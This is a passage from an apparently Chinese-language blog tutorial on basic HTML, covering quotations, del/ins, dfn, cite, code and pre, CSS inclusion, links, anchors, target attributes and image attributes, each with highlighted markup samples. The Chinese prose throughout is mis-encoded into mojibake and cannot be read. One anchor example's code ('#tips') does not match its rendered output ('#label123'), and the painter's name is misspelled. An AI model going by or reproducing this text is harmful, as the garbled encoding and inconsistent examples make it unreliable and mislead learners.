class="token punctuation">&lt;/</span>blockquote</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯çŸ­çš„å¼•ç”¨ï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">&gt;</span></span>è¿™æ˜¯çŸ­çš„å¼•ç”¨ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>q</span><span class="token punctuation">&gt;</span></span></code></pre><p>è¿™æ˜¯é•¿çš„å¼•ç”¨ï¼š</p><blockquote>è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚è¿™æ˜¯é•¿çš„å¼•ç”¨ã€‚</blockquote><p>è¿™æ˜¯çŸ­çš„å¼•ç”¨ï¼š<br><q><br>è¿™æ˜¯çŸ­çš„å¼•ç”¨ã€‚<br></q></p><hr><h3 id="åˆ é™¤çº¿-amp-æ’å…¥çº¿"><a href="#åˆ é™¤çº¿-amp-æ’å…¥çº¿" class="headerlink" title="åˆ é™¤çº¿ &amp; æ’å…¥çº¿"></a>åˆ é™¤çº¿ &amp; æ’å…¥çº¿</h3><p>å¤§å¤šæ•°æµè§ˆå™¨ä¼šæ”¹å†™ä¸ºåˆ é™¤æ–‡æœ¬å’Œä¸‹åˆ’çº¿æ–‡æœ¬ã€‚</p><p>ä¸€äº›è€å¼çš„æµè§ˆå™¨ä¼šæŠŠåˆ é™¤æ–‡æœ¬å’Œä¸‹åˆ’çº¿æ–‡æœ¬æ˜¾ç¤ºä¸ºæ™®é€šæ–‡æœ¬ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>ä¸€æ‰“æœ‰ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">&gt;</span></span>äºŒå<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">&gt;</span></span>åäºŒ<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ins</span><span class="token punctuation">&gt;</span></span> ä»¶ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>ä¸€æ‰“æœ‰ <del>äºŒå</del> <ins>åäºŒ</ins> ä»¶ã€‚</p><hr><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p> HTML5 æ ‡å‡†ï¼š</p><ol><li>å¦‚æœè®¾ç½®äº† <code>&lt;dfn&gt;</code> å…ƒç´ çš„ <code>title</code> å±æ€§ï¼Œåˆ™å®šä¹‰é¡¹ç›®ï¼š</li></ol><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>The <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">&gt;</span></span> was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>The <dfn title="World Health Organization">WHO</dfn> was founded in 1948.</p><ol start="2"><li>å¦‚æœ <code>&lt;dfn&gt;</code> å…ƒç´ åŒ…å«å…·æœ‰æ ‡é¢˜çš„ <code>&lt;abbr&gt;</code> å…ƒç´ ï¼Œåˆ™ <code>title</code> å®šä¹‰é¡¹ç›®ï¼š</li></ol><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">&gt;</span></span>was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>The <dfn><abbr title="World Health Organization">WHO</abbr></dfn> was founded in 1948.</p><ol start="3"><li>å¦åˆ™ï¼Œ<code>&lt;dfn&gt;</code> æ–‡æœ¬å†…å®¹å³æ˜¯é¡¹ç›®ï¼Œå¹¶ä¸”çˆ¶å…ƒç´ åŒ…å«å®šä¹‰ã€‚</li></ol><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">&gt;</span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">&gt;</span></span> World Health Organization æˆç«‹äº 1948 å¹´ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p><dfn>WHO</dfn> World Health Organization æˆç«‹äº 1948 å¹´ã€‚</p><p>è‹¥å¸Œæœ›ç®€è€ŒåŒ–ä¹‹ï¼Œè¯·ä½¿ç”¨<strong>ç¬¬ä¸€æ¡</strong>ï¼Œæˆ–ä½¿ç”¨ <code>&lt;abbr&gt;</code> ä»£æ›¿ã€‚</p><hr><h3 id="è‘—ä½œæ ‡é¢˜"><a href="#è‘—ä½œæ ‡é¢˜" class="headerlink" title="è‘—ä½œæ ‡é¢˜"></a>è‘—ä½œæ ‡é¢˜</h3><p>æµè§ˆå™¨é€šå¸¸ä»¥æ–œä½“æ¥æ˜¾ç¤ºã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cite</span><span class="token punctuation">&gt;</span></span>The Scream<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cite</span><span class="token punctuation">&gt;</span></span> by Edward Munch. Painted in 1893.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p><cite>The Scream</cite> by Edward Munch. Painted in 1893.</p><br><h2 id="è®¡ç®—æœºä»£ç "><a href="#è®¡ç®—æœºä»£ç " class="headerlink" title="è®¡ç®—æœºä»£ç "></a>è®¡ç®—æœºä»£ç </h2><p><code>&lt;code&gt;</code> å…ƒç´ ä¸ä¿ç•™å¤šä½™çš„ç©ºæ ¼å’ŒæŠ˜è¡Œã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span></code></pre><code>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</code><p>éœ€è§£å†³è¯¥é—®é¢˜ï¼Œå¿…é¡»åœ¨ <code>&lt;pre&gt;</code> å…ƒç´ ä¸­åŒ…å›´ä»£ç </p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">&gt;</span></span></code></pre><code><pre>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</pre></code><p>ä¹Ÿå¯ä»¥<code>code</code>å’Œ<code>pre</code>åè¿‡æ¥ã€‚</p><br><h2 id="CSS-æ ·å¼çš„å¼•ç”¨"><a href="#CSS-æ ·å¼çš„å¼•ç”¨" class="headerlink" title="CSS æ ·å¼çš„å¼•ç”¨"></a>CSS æ ·å¼çš„å¼•ç”¨</h2><h3 id="å¤–éƒ¨æ ·å¼è¡¨"><a href="#å¤–éƒ¨æ ·å¼è¡¨" class="headerlink" title="å¤–éƒ¨æ ·å¼è¡¨"></a>å¤–éƒ¨æ ·å¼è¡¨</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="å†…éƒ¨æ ·å¼è¡¨"><a href="#å†…éƒ¨æ ·å¼è¡¨" class="headerlink" title="å†…éƒ¨æ ·å¼è¡¨"></a>å†…éƒ¨æ ·å¼è¡¨</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token style"><span class="token language-css"><span class="token selector">body</span> <span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">}</span><span class="token selector">p</span> <span class="token punctuation">{</span><span class="token property">margin-left</span><span class="token punctuation">:</span> 20px<span class="token punctuation">}</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span></code></pre><h3 id="å†…è”æ ·å¼"><a href="#å†…è”æ ·å¼" class="headerlink" title="å†…è”æ ·å¼"></a>å†…è”æ ·å¼</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">margin-left</span><span class="token punctuation">:</span> 20px</span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>This is a paragraph<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p><strong>ä¼˜å…ˆçº§</strong>æ˜¯ <strong>å†…è”æ ·å¼&gt;å†…éƒ¨æ ·å¼è¡¨&gt;å¤–éƒ¨æ ·å¼è¡¨</strong>ã€‚</p><br><h2 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h2><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p><a href="https://miaotony.xyz">MiaoTonyâ€™s blog</a></p><p>â€œé“¾æ¥æ–‡æœ¬â€ <strong>ä¸å¿…ä¸€å®šæ˜¯æ–‡æœ¬</strong>ã€‚å›¾ç‰‡æˆ–å…¶ä»– HTML å…ƒç´ éƒ½å¯ä»¥æˆä¸ºé“¾æ¥ã€‚</p><p>è¿™æ˜¯å¦ä¸€ä¸ª mailto é“¾æ¥ï¼š</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>å‘é€é‚®ä»¶ï¼<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p><a href="mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!">å‘é€é‚®ä»¶ï¼</a></p><h3 id="target-å±æ€§"><a href="#target-å±æ€§" class="headerlink" title="target å±æ€§"></a>target å±æ€§</h3><p>Target å±æ€§å¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚</p><p><strong>åœ¨æ–°çª—å£æ‰“å¼€ï¼š</strong></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p><a href="https://miaotony.xyz" target="_blank">MiaoTonyâ€™s blog</a></p><p><strong>è·³å‡ºé¡µé¢æ¡†æ¶ï¼š</strong></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_top<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p><a href="https://miaotony.xyz" target="_top">MiaoTonyâ€™s blog</a></p><p><strong>ï¼ˆåœ¨hexoéƒ¨ç½²çš„æ—¶å€™ï¼Œå¥½åƒæŠŠæ‰€æœ‰çš„<code>target</code>éƒ½æ”¹æˆ â€œ_blankâ€ äº† emmm</strong></p><h3 id="name-å±æ€§"><a href="#name-å±æ€§" class="headerlink" title="name å±æ€§"></a>name å±æ€§</h3><p>nameå±æ€§è§„å®šé”šï¼ˆanchorï¼‰çš„åç§°ã€‚å¯ä»¥ä½¿ç”¨ name å±æ€§åˆ›å»º HTML é¡µé¢ä¸­çš„ä¹¦ç­¾ã€‚</p><p>å½“ä½¿ç”¨å‘½åé”šï¼ˆnamed anchorsï¼‰æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºç›´æ¥è·³è‡³è¯¥å‘½åé”šï¼ˆæ¯”å¦‚é¡µé¢ä¸­æŸä¸ªå°èŠ‚ï¼‰çš„é“¾æ¥ã€‚</p><p>é¦–å…ˆ<strong>å¯¹é”šè¿›è¡Œå‘½å</strong>ï¼Œæˆ–è€…è¯´<strong>åˆ›å»ºä¸€ä¸ªä¹¦ç­¾</strong>â€”â€”</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>label123<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>é”šï¼ˆæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ–‡æœ¬ï¼‰<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p><a name="label123">é”šï¼ˆæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ–‡æœ¬ï¼‰</a></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ id å±æ€§æ¥æ›¿ä»£ name å±æ€§ã€‚</p><p>ç„¶ååœ¨åŒä¸€ä¸ªæ–‡æ¡£ä¸­<strong>åˆ›å»ºæŒ‡å‘è¯¥é”šçš„é“¾æ¥</strong>ï¼Œæˆ–åœ¨å…¶ä»–é¡µé¢æŒ‡å‘è¯¥é”šï¼Œå³å¯è·³è½¬åˆ°è¿™ä¸ªé”šç‚¹çš„ä½ç½®ã€‚</p><p>å°† <code>#</code> ç¬¦å·å’Œé”šåç§°æ·»åŠ åˆ° URL çš„æœ«ç«¯ï¼Œå°±å¯ä»¥ç›´æ¥é“¾æ¥åˆ° tips è¿™ä¸ªå‘½åé”šäº†ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#tips<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_self<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>è·³è½¬åˆ°ä¸Šé¢çš„é”šç‚¹<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><p><a href="#label123" target="_self">è·³è½¬åˆ°ä¸Šé¢çš„é”šç‚¹</a></p><p>å‡å¦‚æµè§ˆå™¨æ‰¾ä¸åˆ°å·²å®šä¹‰çš„å‘½åé”šï¼Œé‚£ä¹ˆå°±ä¼šå®šä½åˆ°æ–‡æ¡£çš„é¡¶ç«¯ã€‚ä¸ä¼šæœ‰é”™è¯¯å‘ç”Ÿã€‚</p><br><h2 id="å›¾åƒ"><a href="#å›¾åƒ" class="headerlink" title="å›¾åƒ"></a>å›¾åƒ</h2><p>ç©ºæ ‡ç­¾ï¼ŒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span>  <span class="token punctuation">/&gt;</span></span></code></pre><h3 id="æ›¿ä»£æ–‡æœ¬-alt-å±æ€§"><a href="#æ›¿ä»£æ–‡æœ¬-alt-å±æ€§" class="headerlink" title="æ›¿ä»£æ–‡æœ¬ alt å±æ€§"></a>æ›¿ä»£æ–‡æœ¬ alt å±æ€§</h3><p>åœ¨æµè§ˆå™¨æ— æ³•è½½å…¥å›¾åƒæ—¶ï¼ˆå›¾è£‚äº†ï¼‰ï¼Œæ›¿æ¢æ–‡æœ¬å±æ€§å°†è¢«ç”¨æ¥æ˜¾ç¤ºå¤±å»çš„ä¿¡æ¯ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cat.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>A cat<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>å°±åƒè¿™æ ·ï¼š</p><img src="/2020/02/14/FrontEnd_HTML_Basic/cat.gif" alt="A cat"><h3 id="å›¾åƒèƒŒæ™¯"><a href="#å›¾åƒèƒŒæ™¯" class="headerlink" title="å›¾åƒèƒŒæ™¯"></a>å›¾åƒèƒŒæ™¯</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/background.jpg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><p>å¦‚æœå›¾åƒå°äºé¡µé¢ï¼Œå›¾åƒä¼šè¿›è¡Œé‡å¤ã€‚</p><h3 id="å›¾åƒå¯¹é½"><a href="#å›¾åƒå¯¹é½" class="headerlink" title="å›¾åƒå¯¹é½"></a>å›¾åƒå¯¹é½</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>æœªè®¾ç½®å¯¹é½æ–¹å¼çš„å›¾åƒï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>å›¾åƒ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> åœ¨æ–‡æœ¬ä¸­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">&gt;</span></span>å·²è®¾ç½®å¯¹é½æ–¹å¼çš„å›¾åƒï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>å›¾åƒ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bottom<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> åœ¨æ–‡æœ¬ä¸­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>å›¾åƒ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>middle<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> åœ¨æ–‡æœ¬ä¸­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>å›¾åƒ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> åœ¨æ–‡æœ¬ä¸­<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p>bottom å¯¹é½æ–¹å¼æ˜¯é»˜è®¤çš„å¯¹é½æ–¹å¼ã€‚</p><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin.png" alt="img_aglin"></p><h3 id="æµ®åŠ¨å›¾åƒ"><a href="#æµ®åŠ¨å›¾åƒ" class="headerlink" title="æµ®åŠ¨å›¾åƒ"></a>æµ®åŠ¨å›¾åƒ</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/i/eg_cute.gif<span class="token punctuation">"</span></span> <span class="token attr-name">align</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>left<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> å¸¦æœ‰å›¾åƒçš„ä¸€ä¸ªæ®µè½ã€‚å›¾åƒçš„ align å±æ€§è®¾ç½®ä¸º "left"ã€‚å›¾åƒå°†æµ®åŠ¨åˆ°æ–‡æœ¬çš„å·¦ä¾§ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/i/eg_cute.gif<span class="token punctuation">"</span></span> <span class="token attr-name">align</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>right<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span> å¸¦æœ‰å›¾åƒçš„ä¸€ä¸ªæ®µè½ã€‚å›¾åƒçš„ align å±æ€§è®¾ç½®ä¸º "right"ã€‚å›¾åƒå°†æµ®åŠ¨åˆ°æ–‡æœ¬çš„å³ä¾§ã€‚<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin2.png" alt="æµ®åŠ¨å›¾åƒ"></p><h3 id="å›¾åƒå°ºå¯¸"><a href="#å›¾åƒå°ºå¯¸" class="headerlink" title="å›¾åƒå°ºå¯¸"></a>å›¾åƒå°ºå¯¸</h3><p>é€šè¿‡æ”¹å˜ img æ ‡ç­¾çš„ â€œheightâ€ å’Œ â€œwidthâ€ å±æ€§çš„å€¼ï¼Œå¯ä»¥æ”¾å¤§æˆ–ç¼©å°å›¾åƒã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token 